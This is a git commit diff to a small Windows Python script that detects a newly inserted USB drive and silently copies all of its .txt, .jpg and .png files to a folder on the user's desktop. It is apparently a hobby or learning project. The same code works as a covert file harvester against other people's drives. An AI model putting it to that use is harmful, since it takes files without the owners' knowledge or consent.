48c4e2340eca6226b24dcee2124b0af9c125b7dc
zeynepcakir269453 <zeynepcakir269453@gmail.com>
2023-08-11 12:19:39 +0300

    usb drivers file copy to computer

--- main.py
+++ main.py
@@ -1,5 +1,8 @@
+import shutil
+import time
 from ctypes import windll
 import string
+import os
 
 def drive_find():
     bitmask = windll.kernel32.GetLogicalDrives()
@@ -9,4 +12,21 @@ def drive_find():
             drive.append(harf)
         bitmask>>=1
     return drive
-print(drive_find())
+first=drive_find()
+time.sleep(10)
+second=drive_find()
+if len(second) > len(first):
+    usb_drive= set(second)-set(first)
+    for drive in usb_drive:
+        for ky,ki,di in os.walk(drive+":/"):
+            for x in di:
+                if x.endswith(".txt") or x.endswith(".jpg") or x.endswith(".png"):
+                    shutil.copy(ky+"/"+x,"C:/Users/zeyne/OneDrive/Desktop/usb_file")
+
+
+
+
+
+
+
+
